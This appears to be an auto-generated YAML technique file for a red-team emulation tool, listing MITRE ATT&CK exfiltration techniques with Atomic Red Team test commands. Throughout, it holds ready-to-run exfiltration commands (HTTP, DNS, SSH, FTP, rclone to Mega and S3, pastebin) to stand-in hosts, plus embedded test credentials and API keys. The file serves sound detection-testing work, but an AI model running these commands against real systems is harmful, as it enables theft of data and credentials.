# AutoStrike MITRE ATT&CK Techniques - exfiltration
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1020
  name: Automated Exfiltration
  description: "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)."
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: IcedID Botnet HTTP PUT
      type: powershell
      platform: windows
      command: |-
        $fileName = "C:\temp\T1020_exfilFile.txt"
        $url = "https://google.com"
        $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
        $contentType = "application/octet-stream"
        try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
      cleanup: |-
        $fileName = "C:\temp\T1020_exfilFile.txt"
        Remove-Item -Path $fileName -ErrorAction Ignore
      timeout: 120
    - name: Exfiltration via Encrypted FTP
      type: powershell
      platform: windows
      command: |-
        $sampleData = "Sample data for exfiltration test"
        Set-Content -Path "C:\temp\T1020__FTP_sample.txt" -Value $sampleData
        $ftpUrl = "ftp://example.com"
        $creds = Get-Credential -Credential "[user:password]"
        Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds
      cleanup: Remove-Item -Path "C:\temp\T1020__FTP_sample.txt" -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1020
  is_safe: false
- id: T1030
  name: Data Transfer Size Limits
  description: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Data Transfer Size Limits
      type: sh
      platform: macos
      command: |-
        cd /tmp/T1030; split -b 5000000 T1030_urandom
        ls -l /tmp/T1030
      cleanup: if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;
      timeout: 60
    - name: Data Transfer Size Limits
      type: sh
      platform: linux
      command: |-
        cd /tmp/T1030; split -b 5000000 T1030_urandom
        ls -l /tmp/T1030
      cleanup: if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;
      timeout: 60
    - name: Network-Based Data Transfer in Small Chunks
      type: powershell
      platform: windows
      command: |-
        $file = [System.IO.File]::OpenRead([User specified])
        $chunkSize = 1024 * 1KB
        $buffer = New-Object Byte[] $chunkSize

        while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
            $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
            Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk
        }
        $file.Close()
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1030
  is_safe: false
- id: T1041
  name: Exfiltration Over C2 Channel
  description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: C2 Data Exfiltration
      type: powershell
      platform: windows
      command: "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ \n  1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt\nInvoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive"
      timeout: 120
    - name: Text Based Data Exfiltration using DNS subdomains
      type: powershell
      platform: windows
      command: |-
        $dnsServer = "dns.example.com"
        $exfiltratedData = "SecretDataToExfiltrate"
        $chunkSize = 63

        $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
        $encodedData = [Convert]::ToBase64String($encodedData)
        $chunks = $encodedData -split "(.{$chunkSize})"

        foreach ($chunk in $chunks) {
            $dnsQuery = $chunk + "." + $dnsServer
            Resolve-DnsName -Name $dnsQuery
            Start-Sleep -Seconds 5
        }
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1041
  is_safe: false
- id: T1048
  name: Exfiltration Over Alternative Protocol
  description: "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](http..."
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltration Over Alternative Protocol - SSH
      type: sh
      platform: macos
      command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
      timeout: 60
    - name: Exfiltration Over Alternative Protocol - SSH
      type: sh
      platform: linux
      command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
      timeout: 60
    - name: Exfiltration Over Alternative Protocol - SSH (2)
      type: sh
      platform: macos
      command: tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
      timeout: 60
    - name: Exfiltration Over Alternative Protocol - SSH (2)
      type: sh
      platform: linux
      command: tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
      timeout: 60
    - name: DNSExfiltration (doh)
      type: powershell
      platform: windows
      command: |-
        Import-Module "PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1"
        Invoke-DNSExfiltrator -i "PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500
      timeout: 120
    - name: Exfiltrate Data using DNS Queries via dig
      type: bash
      platform: macos
      command: dig @8.8.8.8 -p 53 $(echo "this is a secret info" | base64).google.com
      timeout: 60
    - name: Exfiltrate Data using DNS Queries via dig
      type: bash
      platform: linux
      command: dig @8.8.8.8 -p 53 $(echo "this is a secret info" | base64).google.com
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1048
  is_safe: false
- id: T1048.002
  name: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
  description: "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each e..."
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltrate data HTTPS using curl windows
      type: cmd
      platform: windows
      command: C:\Windows\System32\Curl.exe -k -F "file=@PathToAtomicsFolder/T1048.002/src/artifact" https://file.io/
      timeout: 120
    - name: Exfiltrate data HTTPS using curl freebsd,linux or macos
      type: bash
      platform: macos
      command: curl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
      timeout: 60
    - name: Exfiltrate data HTTPS using curl freebsd,linux or macos
      type: bash
      platform: linux
      command: curl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
      timeout: 60
    - name: Exfiltrate data in a file over HTTPS using wget
      type: sh
      platform: linux
      command: wget --post-file="PathToAtomicsFolder/T1048.002/src/artifact" --timeout=5 --no-check-certificate https://example.com/ --delete-after
      timeout: 60
    - name: Exfiltrate data as text over HTTPS using wget
      type: sh
      platform: linux
      command: wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1048/002
  is_safe: false
- id: T1048.003
  name: Exfiltration Over Unencrypted Non-C2 Protocol
  description: |-
    Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)

    Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression a...
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltration Over Alternative Protocol - ICMP
      type: powershell
      platform: windows
      command: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
      timeout: 120
    - name: Exfiltration Over Alternative Protocol - HTTP
      type: powershell
      platform: windows
      command: |-
        $content = Get-Content C:\Windows\System32\notepad.exe
        Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content
      timeout: 120
    - name: Exfiltration Over Alternative Protocol - SMTP
      type: powershell
      platform: windows
      command: Send-MailMessage -From test@corp.com -To test@corp.com -Subject "T1048.003 Atomic Test" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1
      timeout: 120
    - name: MAZE FTP Upload
      type: powershell
      platform: windows
      command: |-
        $Dir_to_copy = "$env:windir\temp"
        $ftp = "ftp://127.0.0.1/"
        $web_client = New-Object System.Net.WebClient
        $web_client.Credentials = New-Object System.Net.NetworkCredential('', '')
        if (test-connection -count 1 -computername "127.0.0.1" -quiet)
        {foreach($file in (dir $Dir_to_copy "*.7z"))
        {echo "Uploading $file..."
        $uri = New-Object System.Uri($ftp+$file.name)
        $web_client.UploadFile($uri, $file.FullName)}}
        else
        {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
      cleanup: |-
        $ftp = "ftp://127.0.0.1/"
        try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
        {$uri = New-Object System.Uri($ftp+$file.name)
         $ftp_del = [System.Net.FtpWebRequest]::create($uri)
         $ftp_del.Credentials = New-Object System.Net.NetworkCredential('','')
         $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
         $ftp_del.GetResponse()}} catch{}
      timeout: 120
    - name: Exfiltration Over Alternative Protocol - FTP - Rclone
      type: powershell
      platform: windows
      command: |-
        $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
        $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName
        &$rclone_bin config create ftpserver "ftp" "host" ftp.dlptest.com "port" 21 "user" dlpuser "pass" rNrKYTX9g7z3RgJRmxWuGHbeu
        &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
      timeout: 120
      elevation_required: true
    - name: Python3 http.server
      type: sh
      platform: linux
      command: |-
        [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
        if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1048/003
  is_safe: false
- id: T1567.002
  name: Exfiltration to Cloud Storage
  description: |-
    Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

    Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltrate data with rclone to cloud Storage - Mega (Windows)
      type: powershell
      platform: windows
      command: |-
        New-Item $env:appdata\rclone -ItemType directory
        New-Item $env:appdata\rclone\rclone.conf
        cd "PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\"
        .\rclone.exe config create T1567002 mega
        set-Content $env:appdata\rclone\rclone.conf "[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
        .\rclone.exe copy --max-size 1700k "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" T1567002:test -v
      cleanup: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\"
        .\rclone.exe purge T1567002:test
        .\rclone.exe config delete T1567002:
        Remove-Item $env:appdata\rclone -recurse -force -erroraction silentlycontinue
        cd c:\
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" -recurse -force
      timeout: 120
    - name: Exfiltrate data with rclone to cloud Storage - AWS S3
      type: powershell
      platform: linux
      command: |-
        Write-Host "Deploying AWS infrastructure... " -NoNewLine
        $awsAccessKey = ""
        $awsSecretKey = ""
        cd PathToAtomicsFolder/T1567.002/src/
        if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
          $env:AWS_PROFILE = "default"
        } else {
          $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
          $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
        }
        $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
        $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var "aws_region=us-east-1" -auto-approve
        Write-Host "Done!"
        Write-Host "Generating rclone config... " -NoNewLine
        $config = @"
        [exfils3]
        type = s3
        provider = AWS
        env_auth = true
        region = us-east-1
        "@
        $config | Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf" -Encoding ascii
        Write-Host "Done!"
        Write-Host "Exfiltrating data... " -NoNewLine
        $bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)".Replace("`"","")
        cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
        $null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/" exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
        Write-Host "Done!"
      cleanup: |-
        Write-Host "Destroying AWS infrastructure... " -NoNewLine
        $awsAccessKey = ""
        $awsSecretKey = ""
        cd PathToAtomicsFolder/T1567.002/src/
        if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
          $env:AWS_PROFILE = "default"
        } else {
          $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
          $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
        }
        $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var "aws_region=us-east-1" -auto-approve
        Write-Host "Done!"
      timeout: 120
    - name: Exfiltrate data with rclone to cloud Storage - AWS S3
      type: powershell
      platform: macos
      command: |-
        Write-Host "Deploying AWS infrastructure... " -NoNewLine
        $awsAccessKey = ""
        $awsSecretKey = ""
        cd PathToAtomicsFolder/T1567.002/src/
        if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
          $env:AWS_PROFILE = "default"
        } else {
          $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
          $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
        }
        $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
        $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var "aws_region=us-east-1" -auto-approve
        Write-Host "Done!"
        Write-Host "Generating rclone config... " -NoNewLine
        $config = @"
        [exfils3]
        type = s3
        provider = AWS
        env_auth = true
        region = us-east-1
        "@
        $config | Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf" -Encoding ascii
        Write-Host "Done!"
        Write-Host "Exfiltrating data... " -NoNewLine
        $bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)".Replace("`"","")
        cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
        $null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/" exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
        Write-Host "Done!"
      cleanup: |-
        Write-Host "Destroying AWS infrastructure... " -NoNewLine
        $awsAccessKey = ""
        $awsSecretKey = ""
        cd PathToAtomicsFolder/T1567.002/src/
        if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
          $env:AWS_PROFILE = "default"
        } else {
          $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
          $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
        }
        $null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var "aws_region=us-east-1" -auto-approve
        Write-Host "Done!"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1567/002
  is_safe: false
- id: T1567.003
  name: Exfiltration to Text Storage Sites
  description: "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption..."
  tactic: exfiltration
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)
      type: powershell
      platform: windows
      command: |-
        $apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"
        $content = "secrets, api keys, passwords..."
        $url = "https://pastebin.com/api/api_post.php"
        $postData = @{
          api_dev_key   = $apiKey
          api_option    = "paste"
          api_paste_code = $content
        }
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
        Write-Host "Your paste URL: $response"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1567/003
  is_safe: false
